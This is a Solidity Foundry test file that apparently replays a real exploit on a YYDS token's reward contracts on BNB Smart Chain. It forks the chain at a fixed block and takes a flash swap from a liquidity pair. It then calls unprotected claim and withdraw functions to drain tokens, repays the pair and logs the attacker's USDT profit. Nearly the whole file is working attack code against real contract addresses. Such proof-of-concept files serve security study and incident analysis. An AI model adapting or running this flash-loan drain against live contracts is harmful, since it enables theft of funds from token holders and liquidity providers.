pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface TargetClaim {
    function claim(address) external;
}

interface TargetWithdraw {
    function withdrawReturnAmountByMerchant() external;
    function withdrawReturnAmountByConsumer() external;
    function withdrawReturnAmountByReferral() external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 YYDS = IERC20(0xB19463ad610ea472a886d77a8ca4b983E4fAf245);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xd5cA448b06F8eb5acC6921502e33912FA3D63b12);
    TargetClaim targetClaim = TargetClaim(0xe70cdd37667cdDF52CabF3EdabE377C58FaE99e9);
    TargetWithdraw targetWihtdraw = TargetWithdraw(0x970A76aEa6a0D531096b566340C0de9B027dd39D);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 reserve0;
    uint256 reserve1;

    function setUp() public {
        cheats.createSelectFork("bsc", 21_157_025);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);

        (reserve0, reserve1,) = Pair.getReserves();
        uint256 amount0Out = USDT.balanceOf(address(Pair));
        Pair.swap(amount0Out - 1 * 1e18, 0, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        emit log_named_decimal_uint("Attacker YYDS balance before exploit", YYDS.balanceOf(address(this)), 18);

        targetClaim.claim(address(this));
        try targetWihtdraw.withdrawReturnAmountByReferral() {} catch {}
        try targetWihtdraw.withdrawReturnAmountByMerchant() {} catch {}
        try targetWihtdraw.withdrawReturnAmountByConsumer() {} catch {}

        emit log_named_decimal_uint("Attacker YYDS balance after exploit", YYDS.balanceOf(address(this)), 18);

        uint256 yydsInContract = YYDS.balanceOf(address(this));
        YYDS.transfer(address(Pair), yydsInContract);
        uint256 yydsInPair = YYDS.balanceOf(address(Pair));
        uint256 amountUsdt =
            (reserve0 * reserve1 / ((yydsInPair * 10_000 - yydsInContract * 25) / 10_000)) / 9975 * 10_000;
        USDT.transfer(address(Pair), amountUsdt);
    }
}
